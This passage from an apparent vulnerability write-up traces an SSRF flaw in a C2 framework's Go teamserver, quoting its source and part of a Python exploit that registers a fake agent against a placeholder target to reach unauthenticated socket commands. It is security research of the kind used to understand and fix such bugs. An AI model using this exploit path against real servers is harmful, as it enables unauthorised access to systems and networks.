</span></span><span style="display:flex;"><span>magic <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde\xad\xbe\xef</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>teamserver_listener_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://TARGET&#34;</span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>agent_id <span style="color:#f92672">=</span> int_to_bytes(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">100000</span>, <span style="color:#ae81ff">1000000</span>))
</span></span><span style="display:flex;"><span>AES_Key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>AES_IV <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>hostname <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;DESKTOP-7F61JT1&#34;</span>
</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;neo&#34;</span>
</span></span><span style="display:flex;"><span>domain_name <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;MATRIX&#34;</span>
</span></span><span style="display:flex;"><span>internal_ip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;10.1.33.7&#34;</span>
</span></span><span style="display:flex;"><span>process_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;msedge.exe&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-16le&#34;</span>)
</span></span><span style="display:flex;"><span>process_id <span style="color:#f92672">=</span> int_to_bytes(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">5000</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)
</span></span></code></pre></div><p>Now that we have successfully registered the agent, we can hit anything behind the <code>Teamserver.AgentExist(Header.AgentID)</code> check.  Let&rsquo;s trace the flow to the SSRF sink.  Looking at the other branch within the <code>parseAgentRequest</code> function, we can see that the <code>Command</code> variable is parsed from the <code>Header.Data</code>, and a subsequent call to <code>DecryptBuffer</code> is observed.  After these lines, we can see that the <code>Agent.TaskDispatch</code> function is called if the <code>Command</code> variable is set to <code>COMMAND_GET_JOB</code> (0x01)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span>	<span style="color:#75715e">/* check if the agent exists. */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Teamserver</span>.<span style="color:#a6e22e">AgentExist</span>(<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">AgentID</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* get our agent instance based on the agent id */</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Agent</span> = <span style="color:#a6e22e">Teamserver</span>.<span style="color:#a6e22e">AgentInstance</span>(<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">AgentID</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Agent</span>.<span style="color:#a6e22e">UpdateLastCallback</span>(<span style="color:#a6e22e">Teamserver</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// while we can read a command and request id, parse new packages
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">first_iter</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">asked_for_jobs</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Data</span>.<span style="color:#a6e22e">CanIRead</span>(([]<span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadType</span>{<span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>}))) {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">Command</span>   = uint32(<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Data</span>.<span style="color:#a6e22e">ParseInt32</span>())
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">RequestID</span> = uint32(<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Data</span>.<span style="color:#a6e22e">ParseInt32</span>())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">/* check if this is a &#39;reconnect&#39; request */</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Command</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">agent</span>.<span style="color:#a6e22e">DEMON_INIT</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">first_iter</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">first_iter</span> = <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// if the message is not a reconnect, decrypt the buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Data</span>.<span style="color:#a6e22e">DecryptBuffer</span>(<span style="color:#a6e22e">Agent</span>.<span style="color:#a6e22e">Encryption</span>.<span style="color:#a6e22e">AESKey</span>, <span style="color:#a6e22e">Agent</span>.<span style="color:#a6e22e">Encryption</span>.<span style="color:#a6e22e">AESIv</span>)
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">/* The agent is sending us the result of a task */</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Command</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">agent</span>.<span style="color:#a6e22e">COMMAND_GET_JOB</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">Parser</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">NewParser</span>(<span style="color:#a6e22e">Header</span>.<span style="color:#a6e22e">Data</span>.<span style="color:#a6e22e">ParseBytes</span>())
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">Agent</span>.<span style="color:#a6e22e">TaskDispatch</span>(<span style="color:#a6e22e">RequestID</span>, <span style="color:#a6e22e">Command</span>, <span style="color:#a6e22e">Parser</span>, <span style="color:#a6e22e">Teamserver</span>)
</span></span><span style="display:flex;"><span>			} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">asked_for_jobs</span> = <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span></code></pre></div><p>The <code>TaskDispatch</code> function is responsible for serving tasks the operator issues from the client to the agents to execute.  Since we cannot force the operator to issue a new task, I was interested in auditing paths under this function that don&rsquo;t require the operator to issue a task to hit - and especially those that had some kind of abusable functionality.  We can see in the first section of this function, there is a call to the <code>IsKnownRequestID</code> function.  If this function returns false, we will be rejected by the teamserver.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">a</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Agent</span>) <span style="color:#a6e22e">TaskDispatch</span>(<span style="color:#a6e22e">RequestID</span> <span style="color:#66d9ef">uint32</span>, <span style="color:#a6e22e">CommandID</span> <span style="color:#66d9ef">uint32</span>, <span style="color:#a6e22e">Parser</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">Parser</span>, <span style="color:#a6e22e">teamserver</span> <span style="color:#a6e22e">TeamServer</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">NameID</span>, <span style="color:#a6e22e">_</span> = <span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">ParseInt</span>(<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">NameID</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">AgentID</span> <span style="color:#f92672">:=</span> int(<span style="color:#a6e22e">NameID</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* if the RequestID was not generated by the TS, reject the request */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">IsKnownRequestID</span>(<span style="color:#a6e22e">teamserver</span>, <span style="color:#a6e22e">RequestID</span>, <span style="color:#a6e22e">CommandID</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Warn</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;Agent: %x, CommandID: %d, unknown RequestID: %x. This is either a bug or malicious activity&#34;</span>, <span style="color:#a6e22e">AgentID</span>, <span style="color:#a6e22e">CommandID</span>, <span style="color:#a6e22e">RequestID</span>))
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span></code></pre></div><p>Looking at the <code>IsKnownRequestID</code> function, we can see at the bottom the code iterates through the agent task slice and will return <code>true</code> if there is a task <code>RequestID</code> that matches the one we sent.  Since the <code>RequestID</code> is an unsigned 32 bit integer, we have no hope for brute forcing a correct <code>RequestID</code>, and since we have no access to the operator interface, we cannot generate a valid <code>RequestID</code>.  However, we can see 3 additional checks beforehand that will return true <strong>irregardless</strong> of the <code>RequestID</code> (and thus, irregardless if the C2 operator issued the task or not)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// check that the request the agent is valid
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">a</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Agent</span>) <span style="color:#a6e22e">IsKnownRequestID</span>(<span style="color:#a6e22e">teamserver</span> <span style="color:#a6e22e">TeamServer</span>, <span style="color:#a6e22e">RequestID</span> <span style="color:#66d9ef">uint32</span>, <span style="color:#a6e22e">CommandID</span> <span style="color:#66d9ef">uint32</span>) <span style="color:#66d9ef">bool</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// some commands are always accepted because they don&#39;t follow the &#34;send task and get response&#34; format
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">switch</span> <span style="color:#a6e22e">CommandID</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">COMMAND_SOCKET</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">COMMAND_PIVOT</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">teamserver</span>.<span style="color:#a6e22e">SendLogs</span>() <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">CommandID</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">BEACON_OUTPUT</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// if SendLogs is on, accept all BEACON_OUTPUT so that the agent can send logs
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">Tasks</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">Tasks</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">RequestID</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">RequestID</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We note that the following <code>CommandID</code>s will be processed by the teamserver even if there is no matching task issued.</p>
<pre tabindex="0"><code>COMMAND_SOCKET
COMMAND_PIVOT
BEACON_OUTPUT
</code></pre><p>Looking further down in the <code>TaskDispatch</code> function, we can see a switch statement followed by a case for each of our <code>CommandID</code>s</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">a</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Agent</span>) <span style="color:#a6e22e">TaskDispatch</span>(<span style="color:#a6e22e">RequestID</span> <span style="color:#66d9ef">uint32</span>, <span style="color:#a6e22e">CommandID</span> <span style="color:#66d9ef">uint32</span>, <span style="color:#a6e22e">Parser</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">Parser</span>, <span style="color:#a6e22e">teamserver</span> <span style="color:#a6e22e">TeamServer</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">NameID</span>, <span style="color:#a6e22e">_</span> = <span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">ParseInt</span>(<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">NameID</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">64</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">AgentID</span> <span style="color:#f92672">:=</span> int(<span style="color:#a6e22e">NameID</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* if the RequestID was not generated by the TS, reject the request */</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">IsKnownRequestID</span>(<span style="color:#a6e22e">teamserver</span>, <span style="color:#a6e22e">RequestID</span>, <span style="color:#a6e22e">CommandID</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Warn</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;Agent: %x, CommandID: %d, unknown RequestID: %x. This is either a bug or malicious activity&#34;</span>, <span style="color:#a6e22e">AgentID</span>, <span style="color:#a6e22e">CommandID</span>, <span style="color:#a6e22e">RequestID</span>))
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span> <span style="color:#a6e22e">CommandID</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">COMMAND_GET_JOB</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">COMMAND_OUTPUT</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">BEACON_OUTPUT</span>:  <span style="color:#75715e">// We can reach this
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">COMMAND_INJECT_DLL</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">COMMAND_PIVOT</span>: <span style="color:#75715e">// We can reach this
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">COMMAND_TRANSFER</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">COMMAND_SOCKET</span>:  <span style="color:#75715e">// We can reach this
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">COMMAND_KERBEROS</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span></code></pre></div><p>Let&rsquo;s look at the <code>COMMAND_SOCKET</code> case, in which the vulnerability exists.  We can see that a <code>SubCommand</code> variable is read, and another switch statement begins.   This appears to be part of the demon&rsquo;s rportfwd/socks proxy capabilities and has been left unprotected!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#a6e22e">COMMAND_SOCKET</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> (
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">SubCommand</span> = <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Message</span>    <span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>	)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">CanIRead</span>([]<span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadType</span>{<span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>}) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">SubCommand</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">switch</span> <span style="color:#a6e22e">SubCommand</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">SOCKET_COMMAND_RPORTFWD_ADD</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">SOCKET_COMMAND_RPORTFWD_LIST</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">SOCKET_COMMAND_RPORTFWD_REMOVE</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">SOCKET_COMMAND_RPORTFWD_CLEAR</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">SOCKET_COMMAND_SOCKSPROXY_ADD</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">SOCKET_COMMAND_OPEN</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">SOCKET_COMMAND_READ</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">SOCKET_COMMAND_WRITE</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">SOCKET_COMMAND_CLOSE</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> <span style="color:#a6e22e">SOCKET_COMMAND_CONNECT</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">default</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;Agent: %x, Command: COMMAND_SOCKET - UNKNOWN (%d)&#34;</span>, <span style="color:#a6e22e">AgentID</span>, <span style="color:#a6e22e">SubCommand</span>))
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		
</span></span></code></pre></div><p>Looking at the <code>SOCKET_COMMND_OPEN</code> case, we can see that a few variables that look to be related to creation of a socket are read from the <code>Parser</code>.  Further down, we observe a call to <code>PortFwdNew</code> with these newly created variables.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#a6e22e">SOCKET_COMMAND_OPEN</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">CanIRead</span>([]<span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadType</span>{<span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>, <span style="color:#a6e22e">parser</span>.<span style="color:#a6e22e">ReadInt32</span>}) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">var</span> (
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">SocktID</span> = <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">LclAddr</span> = <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">LclPort</span> = <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">FwdAddr</span> = <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">FwdPort</span> = <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">FwdString</span> <span style="color:#66d9ef">string</span>
</span></span><span style="display:flex;"><span>		)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">SocktID</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">LclAddr</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">LclPort</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">FwdAddr</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">FwdPort</span> = <span style="color:#a6e22e">Parser</span>.<span style="color:#a6e22e">ParseInt32</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// avoid too much spam
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#75715e">//logger.Debug(fmt.Sprintf(&#34;Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_OPEN, SocktID: %08x, LclAddr: %d, LclPort: %d, FwdAddr: %d, FwdPort: %d&#34;, AgentID, SocktID, LclAddr, LclPort, FwdAddr, FwdPort))
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">FwdString</span> = <span style="color:#a6e22e">common</span>.<span style="color:#a6e22e">Int32ToIpString</span>(int64(<span style="color:#a6e22e">FwdAddr</span>))
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">FwdString</span> = <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;%s:%d&#34;</span>, <span style="color:#a6e22e">FwdString</span>, <span style="color:#a6e22e">FwdPort</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">Socket</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">PortFwdGet</span>(<span style="color:#a6e22e">SocktID</span>); <span style="color:#a6e22e">Socket</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">/* Socket already exists. don&#39;t do anything. */</span>
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#e6db74">&#34;Socket already exists&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* add this rportfwd */</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">PortFwdNew</span>(<span style="color:#a6e22e">SocktID</span>, <span style="color:#a6e22e">LclAddr</span>, <span style="color:#a6e22e">LclPort</span>, <span style="color:#a6e22e">FwdAddr</span>, <span style="color:#a6e22e">FwdPort</span>, <span style="color:#a6e22e">FwdString</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* we will open the rportfwd client only after we have something to write */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">logger</span>.<span style="color:#a6e22e">Debug</span>(<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_OPEN, Invalid packet&#34;</span>, <span style="color:#a6e22e">AgentID</span>))
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">break</span>
</span></span></code></pre></div><p>In the <code>PortFwdNew</code> function, we see that a <code>&amp;PortFwd</code> struct is created with the parameters passed in, and is added to the agent <code>PortFwds</code> slice</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">a</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">Agent</span>) <span style="color:#a6e22e">PortFwdNew</span>(<span style="color:#a6e22e">SocketID</span>, <span style="color:#a6e22e">LclAddr</span>, <span style="color:#a6e22e">LclPort</span>, <span style="color:#a6e22e">FwdAddr</span>, <span style="color:#a6e22e">FwdPort</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">Target</span> <span style="color:#66d9ef">string</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">portfwd</span> = <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">PortFwd</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Conn</span>:    <span style="color:#66d9ef">nil</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">SocktID</span>: <span style="color:#a6e22e">SocketID</span>,
